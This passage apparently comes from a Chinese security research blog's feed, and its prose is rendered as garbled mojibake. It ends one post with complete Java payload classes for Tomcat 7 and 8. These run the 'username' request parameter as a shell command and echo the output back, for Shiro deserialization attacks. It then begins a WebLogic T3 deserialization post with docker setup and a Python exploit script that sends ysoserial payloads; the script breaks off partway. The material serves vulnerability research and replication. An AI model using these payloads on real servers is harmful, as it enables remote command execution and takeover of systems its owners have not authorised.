æ‰¾å°±å¥½äº†ï¼Œä»£ç è·Ÿè¸ªè¿‡äºå†—é•¿è€Œä¸”æˆ‘ä¹Ÿæ²¡ç»†ç»†æ¢ç©¶æ¯ä¸€æ­¥çš„æ„ä¹‰ï¼Œå°±ä¸è£…æ¨¡ä½œæ ·çš„åˆ†æäº†ï¼Œè¿™é‡Œç›´æ¥ç»™ç»“è®ºã€‚<br><img src="1585579952767-ef1b2c0c-0d84-4ec1-953f-89236110b0ab.png#align=left&display=inline&height=645&name=image.png&originHeight=1290&originWidth=2176&size=948160&status=done&style=none&width=1088" alt="image.png"></p><p>é€šè¿‡ideaçš„è®¡ç®—åŠŸèƒ½æˆ‘ä»¬å¯ä»¥ç¬¦åˆç›´è§‰çš„æ‹¿åˆ°responseï¼Œå®é™…æƒ³è·å–è¿˜æ˜¯éœ€è¦å„ç§åå°„çš„ã€‚tomcat7,8è·å–è¿™æ¡é“¾çš„æ–¹å¼å¤§åŒå°å¼‚ï¼Œå˜åŒ–ä¹‹å¤„åœ¨äº<code>name=&quot;http-bio-8888&quot;,type=GlobalRequestProcessor</code>ï¼Œå…¶ä¸­8888æ˜¯tomcatæœåŠ¡ç«¯ç«¯å£ï¼Œåœ¨tomcat8é‡Œé¢bioå˜ä¸ºnioã€‚å…³äº<a href="https://blog.csdn.net/ClementAD/article/details/47045673">bioï¼Œnioçš„ç»†èŠ‚å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« </a>ã€‚</p><p>é™¤æ­¤ä¹‹å¤–åœ¨å®é™…åœºæ™¯ä¸‹ä¼šæœ‰å¾ˆå¤šrequestsæ˜¯è¦éå†processorsä¸­çš„å„ä¸ªrequestsã€‚</p><h2 id="demoä»£ç "><a href="#demoä»£ç " class="headerlink" title="demoä»£ç "></a>demoä»£ç </h2><p>tomcat8çš„demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.Request;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.buf.ByteChunk;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.modeler.Registry;</span><br><span class="line"><span class="keyword">import</span> javax.management.MBeanServer;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">tomcat82</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">tomcat82</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            MBeanServer mbeanServer = Registry.getRegistry((Object)<span class="keyword">null</span>, (Object)<span class="keyword">null</span>).getMBeanServer();</span><br><span class="line">            Field field = Class.forName(<span class="string">"com.sun.jmx.mbeanserver.JmxMBeanServer"</span>).getDeclaredField(<span class="string">"mbsInterceptor"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            Object obj = field.get(mbeanServer);</span><br><span class="line"></span><br><span class="line">            field = Class.forName(<span class="string">"com.sun.jmx.interceptor.DefaultMBeanServerInterceptor"</span>).getDeclaredField(<span class="string">"repository"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            obj = field.get(obj);</span><br><span class="line"></span><br><span class="line">            field = Class.forName(<span class="string">"com.sun.jmx.mbeanserver.Repository"</span>).getDeclaredField(<span class="string">"domainTb"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            HashMap obj2 = (HashMap)field.get(obj);</span><br><span class="line">            obj = ((HashMap)obj2.get(<span class="string">"Catalina"</span>)).get(<span class="string">"name=\"http-nio-8888\",type=GlobalRequestProcessor"</span>);</span><br><span class="line"></span><br><span class="line">            field = Class.forName(<span class="string">"com.sun.jmx.mbeanserver.NamedObject"</span>).getDeclaredField(<span class="string">"object"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            obj = field.get(obj);</span><br><span class="line"></span><br><span class="line">            field = Class.forName(<span class="string">"org.apache.tomcat.util.modeler.BaseModelMBean"</span>).getDeclaredField(<span class="string">"resource"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            obj = field.get(obj);</span><br><span class="line"></span><br><span class="line">            field = Class.forName(<span class="string">"org.apache.coyote.RequestGroupInfo"</span>).getDeclaredField(<span class="string">"processors"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            ArrayList obj3 = (ArrayList)field.get(obj);</span><br><span class="line"></span><br><span class="line">            field = Class.forName(<span class="string">"org.apache.coyote.RequestInfo"</span>).getDeclaredField(<span class="string">"req"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">boolean</span> isLinux = <span class="keyword">true</span>;</span><br><span class="line">            String osTyp = System.getProperty(<span class="string">"os.name"</span>);</span><br><span class="line">            <span class="keyword">if</span> (osTyp != <span class="keyword">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">"win"</span>)) &#123;</span><br><span class="line">                isLinux = <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; obj3.size(); i++) &#123;</span><br><span class="line">                Request obj4 = (Request) field.get(obj3.get(i));</span><br><span class="line">                String username = obj4.getParameters().getParameter(<span class="string">"username"</span>);</span><br><span class="line">                <span class="keyword">if</span>(username != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    String[] cmds = isLinux ? <span class="keyword">new</span> String[]&#123;<span class="string">"sh"</span>, <span class="string">"-c"</span>, username&#125; : <span class="keyword">new</span> String[]&#123;<span class="string">"cmd.exe"</span>, <span class="string">"/c"</span>,  username&#125;;</span><br><span class="line">                    InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                    Scanner s = <span class="keyword">new</span> Scanner(in).useDelimiter(<span class="string">"\\a"</span>);</span><br><span class="line">                    String output = <span class="string">""</span>;</span><br><span class="line">                    <span class="keyword">while</span> (s.hasNext())&#123;</span><br><span class="line">                        output += s.next();</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">byte</span>[] buf = output.getBytes();</span><br><span class="line">                    ByteChunk bc = <span class="keyword">new</span> ByteChunk();</span><br><span class="line">                    bc.setBytes(buf, <span class="number">0</span>, buf.length);</span><br><span class="line">                    obj4.getResponse().doWrite(bc);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>tomcat7çš„demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.Request;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.buf.ByteChunk;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.modeler.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.MBeanServer;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">tomcat72</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">tomcat72</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line"></span><br><span class="line">            MBeanServer mbeanServer = Registry.getRegistry((Object)<span class="keyword">null</span>, (Object)<span class="keyword">null</span>).getMBeanServer();</span><br><span class="line">            Field field = Class.forName(<span class="string">"com.sun.jmx.mbeanserver.JmxMBeanServer"</span>).getDeclaredField(<span class="string">"mbsInterceptor"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            Object obj = field.get(mbeanServer);</span><br><span class="line"></span><br><span class="line">            field = Class.forName(<span class="string">"com.sun.jmx.interceptor.DefaultMBeanServerInterceptor"</span>).getDeclaredField(<span class="string">"repository"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            obj = field.get(obj);</span><br><span class="line"></span><br><span class="line">            field = Class.forName(<span class="string">"com.sun.jmx.mbeanserver.Repository"</span>).getDeclaredField(<span class="string">"domainTb"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            HashMap obj2 = (HashMap)field.get(obj);</span><br><span class="line">            obj = ((HashMap)obj2.get(<span class="string">"Catalina"</span>)).get(<span class="string">"name=\"http-bio-8888\",type=GlobalRequestProcessor"</span>);</span><br><span class="line"></span><br><span class="line">            field = Class.forName(<span class="string">"com.sun.jmx.mbeanserver.NamedObject"</span>).getDeclaredField(<span class="string">"object"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            obj = field.get(obj);</span><br><span class="line"></span><br><span class="line">            field = Class.forName(<span class="string">"org.apache.tomcat.util.modeler.BaseModelMBean"</span>).getDeclaredField(<span class="string">"resource"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            obj = field.get(obj);</span><br><span class="line"></span><br><span class="line">            field = Class.forName(<span class="string">"org.apache.coyote.RequestGroupInfo"</span>).getDeclaredField(<span class="string">"processors"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            ArrayList obj3 = (ArrayList)field.get(obj);</span><br><span class="line"></span><br><span class="line">            field = Class.forName(<span class="string">"org.apache.coyote.RequestInfo"</span>).getDeclaredField(<span class="string">"req"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">boolean</span> isLinux = <span class="keyword">true</span>;</span><br><span class="line">            String osTyp = System.getProperty(<span class="string">"os.name"</span>);</span><br><span class="line">            <span class="keyword">if</span> (osTyp != <span class="keyword">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">"win"</span>)) &#123;</span><br><span class="line">                isLinux = <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; obj3.size(); i++) &#123;</span><br><span class="line">                Request obj4 = (Request) field.get(obj3.get(i));</span><br><span class="line">                String username = obj4.getParameters().getParameter(<span class="string">"username"</span>);</span><br><span class="line">                <span class="keyword">if</span>(username != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    String[] cmds = isLinux ? <span class="keyword">new</span> String[]&#123;<span class="string">"sh"</span>, <span class="string">"-c"</span>, username&#125; : <span class="keyword">new</span> String[]&#123;<span class="string">"cmd.exe"</span>, <span class="string">"/c"</span>,  username&#125;;</span><br><span class="line">                    InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                    Scanner s = <span class="keyword">new</span> Scanner(in).useDelimiter(<span class="string">"\\a"</span>);</span><br><span class="line">                    String output = <span class="string">""</span>;</span><br><span class="line">                    <span class="keyword">while</span> (s.hasNext())&#123;</span><br><span class="line">                        output += s.next();</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">byte</span>[] buf = output.getBytes();</span><br><span class="line">                    ByteChunk bc = <span class="keyword">new</span> ByteChunk();</span><br><span class="line">                    bc.setBytes(buf, <span class="number">0</span>, buf.length);</span><br><span class="line">                    obj4.getResponse().doWrite(bc);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"><span class="comment">//            System.out.println("=======================");</span></span><br><span class="line"><span class="comment">//            System.out.println(e);</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦å¤–å¦‚æœæœ‰å¸ˆå‚…åœ¨å¤ç°çš„æ—¶å€™å‘ç°headerè¶…é•¿ï¼Œå¯ä»¥å‚è€ƒ<a href="https://xz.aliyun.com/t/6227">ç¼©å°ysoserial payloadä½“ç§¯çš„å‡ ä¸ªæ–¹æ³•</a>ã€‚ï¼ˆä¹Ÿå¯ä»¥å‚è€ƒé•¿äº­å¸ˆå‚…ç»™çš„ä¿®æ”¹headerå¤´çš„æ€è·¯ï¼Œå®é™…å¼„èµ°çš„æ—¶å€™ä¹Ÿè®¸ä¼šé‡åˆ°ä¸€äº›å‘ï¼‰</p><p>tomcat7+simple-shiro-webæˆåŠŸå¤ç°<br><img src="1585898629028-36d3e3fb-588d-4acd-8b68-a32c49da90a7.png#align=left&display=inline&height=541&name=image.png&originHeight=1082&originWidth=2568&size=511446&status=done&style=none&width=1284" alt="image.png"></p><h2 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h2><p>æ„Ÿè°¢å¤§å¸ˆå‚…ä»¬å¼€æºçš„è‡ªå·±çš„æ€è·¯ï¼Œå­¦åˆ°å¾ˆå¤šã€‚å…¶æ¬¡åœ¨ç ”ç©¶è¿™ç§æ–¹æ³•çš„æ—¶å€™å‘ç°è¿˜æœ‰å…¶ä»–å¾ˆå¤šMBeanï¼Œä¹Ÿè®¸è¿˜æœ‰å¾ˆå¤šå¥½ç©çš„ä¸œè¥¿ï¼Ÿ</p>]]></content>
    
    <summary type="html">
    
      ç¦»å¤§ç»“å±€åˆè¿›äº†ä¸€æ­¥
    
    </summary>
    
    
      <category term="web security" scheme="https://cl0und.github.io/categories/web-security/"/>
    
    
      <category term="java" scheme="https://cl0und.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>weblogicå†å²T3ååºåˆ—åŒ–æ¼æ´åŠè¡¥ä¸æ¢³ç†</title>
    <link href="https://cl0und.github.io/2020/03/25/weblogic%E5%8E%86%E5%8F%B2T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E8%A1%A5%E4%B8%81%E6%A2%B3%E7%90%86/"/>
    <id>https://cl0und.github.io/2020/03/25/weblogic%E5%8E%86%E5%8F%B2T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E8%A1%A5%E4%B8%81%E6%A2%B3%E7%90%86/</id>
    <published>2020-03-25T09:57:05.000Z</published>
    <updated>2020-07-11T08:04:03.381Z</updated>
    
    <content type="html"><![CDATA[<!-- å¦‚é¢˜ --><!-- more --><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>ä½¿ç”¨ateamå¤§å“¥å¼€æºçš„è°ƒè¯•ç¯å¢ƒ<a href="https://github.com/QAX-A-Team/WeblogicEnvironment">Weblogicç¯å¢ƒæ­å»ºå·¥å…·</a></p><h3 id="æ¼æ´ç¯å¢ƒæ­å»º"><a href="#æ¼æ´ç¯å¢ƒæ­å»º" class="headerlink" title="æ¼æ´ç¯å¢ƒæ­å»º"></a>æ¼æ´ç¯å¢ƒæ­å»º</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker build --build-arg JDK_PKG=jdk-7u21-linux-x64.tar.gz --build-arg WEBLOGIC_JAR=wls1036_generic.jar  -t weblogic1036jdk7u21 .</span><br><span class="line">docker run -d -p 7001:7001 -p 8453:8453 -p 5556:5556 --name weblogic1036jdk7u21 weblogic1036jdk7u21</span><br></pre></td></tr></table></figure><h3 id="è°ƒè¯•ç¯å¢ƒæ­å»º"><a href="#è°ƒè¯•ç¯å¢ƒæ­å»º" class="headerlink" title="è°ƒè¯•ç¯å¢ƒæ­å»º"></a>è°ƒè¯•ç¯å¢ƒæ­å»º</h3><p>å°†weblogicä¾èµ–çš„jaråŒ…æ‹·è´å‡ºæ¥å¹¶å¯¼å…¥ideaã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir wlserver1036</span><br><span class="line">docker cp weblogic1036jdk7u21:/u01/app/oracle/middleware/modules ./wlserver1036</span><br><span class="line">docker cp weblogic1036jdk7u21:/u01/app/oracle/middleware/wlserver/server/lib ./wlserver1036</span><br><span class="line">docker cp weblogic1036jdk7u21:/u01/app/oracle/middleware/coherence_3.7/lib ./coherence_3.7/lib</span><br></pre></td></tr></table></figure><p><img src="1584628921983-32316897-d553-44d1-96f7-dac78f09b6b7.png" alt="image.png"></p><p>è¿œç¨‹è°ƒè¯•é…ç½®<br><img src="1584628994284-2bcf4d7e-e223-411e-ad60-c66f5bea1520.png" alt="image.png"></p><h2 id="T3-åè®®è¯´æ˜"><a href="#T3-åè®®è¯´æ˜" class="headerlink" title="T3 åè®®è¯´æ˜"></a>T3 åè®®è¯´æ˜</h2><p>t3æ˜¯oracleå¯¹rmiçš„å¢å¼ºï¼Œå’Œrmiä¸€æ ·åœ¨ç½‘ç»œé—´ä¼ è¾“æ—¶æ•°æ®æ˜¯åºåˆ—åŒ–è¿‡çš„ã€‚æ–‡ç« çš„é‡ç‚¹åœ¨äºåˆ†ææ¼æ´ä»¥åŠè¡¥ä¸ä¸ºä»€ä¹ˆå¯ä»¥ç»•è¿‡ï¼Œå°±ä¸åˆ†æt3åè®®æ•°æ®çš„æ ¼å¼äº†ï¼Œåœ¨å¤ç°æ—¶æˆ‘ä»¬åªéœ€è¦å°†ç”Ÿæˆçš„æ¶æ„åºåˆ—åŒ–æ•°æ®å¥—åœ¨pyæ¨¡ç‰ˆä¸­å³å¯ã€‚å¦‚æœæœ‰å¸ˆå‚…æƒ³å¯¹weblogicä½“ç³»åŠå…¶t3åè®®çš„æ­£å¸¸ä½¿ç”¨æ„Ÿå…´è¶£æ¨èé˜…è¯»<a href="https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&mid=2247485058&idx=1&sn=d22b310acf703a32d938a7087c8e8704">WebLogicå®‰å…¨ç ”ç©¶æŠ¥å‘Š</a>ã€‚</p><h2 id="CVE-2015-4852"><a href="#CVE-2015-4852" class="headerlink" title="CVE-2015-4852"></a>CVE-2015-4852</h2><p>t3åè®®çš„ä¼ è¾“è¿‡æ¥çš„æ•°æ®ä¼šåœ¨weblogic.rjvm.InboundMsgAbbrev#readObjectä¸­è¯»å–å¹¶è¿›è¡Œååºåˆ—åŒ–ã€‚<br><img src="1584601233181-753caf13-53d7-4aac-8418-72313cad68bc.png" alt="image.png"><br>å› ä¸ºæ˜¯t3ç¬¬ä¸€æ´æ‰€ä»¥å¯ä»¥çœ‹åˆ°ServerChannelInputStreamçš„resolveClasså¹¶æ²¡æœ‰ä»»ä½•åšé˜²å¾¡ã€‚<img src="1584601257106-fcbcd3bf-a03a-475c-b81e-b9a076e86ab2.png" alt="image.png"><br>è‡ªå¸¦ccé“¾<br><img src="1584628722500-b9b2433c-a6e7-47a8-ad72-91ff7179875c.png" alt="image.png"></p><p>æ‰€ä»¥åªéœ€è¦æŠŠysoserialçš„ç”Ÿæˆçš„payloadåµŒå…¥t3åè®®å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_payload1</span><span class="params">(gadget, command)</span>:</span></span><br><span class="line">    JAR_FILE = <span class="string">'/Users/cengsiqi/Desktop/javasectools/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar'</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">'java'</span>, <span class="string">'-jar'</span>, JAR_FILE, gadget, command], stdout=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">return</span> popen.stdout.read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_payload2</span><span class="params">(path)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(path, <span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(host, port, payload)</span>:</span></span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((host, port))</span><br><span class="line"></span><br><span class="line">    handshake = <span class="string">"t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n"</span>.encode()</span><br><span class="line">    sock.sendall(handshake)</span><br><span class="line">    data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    pattern = re.compile(<span class="string">r"HELO:(.*).false"</span>)</span><br><span class="line">    version = re.findall(pattern, data.decode())</span><br><span class="line">    <span class="keyword">if</span> len(version) == <span class="number">0</span>:</span><br><span class="line">        print(<span class="string">"Not Weblogic"</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">"Weblogic &#123;&#125;"</span>.format(version[<span class="number">0</span>]))</span><br><span class="line">    data_len = binascii.a2b_hex(<span class="string">b"00000000"</span>) <span class="comment">#æ•°æ®åŒ…é•¿åº¦ï¼Œå…ˆå ä½ï¼Œåé¢ä¼šæ 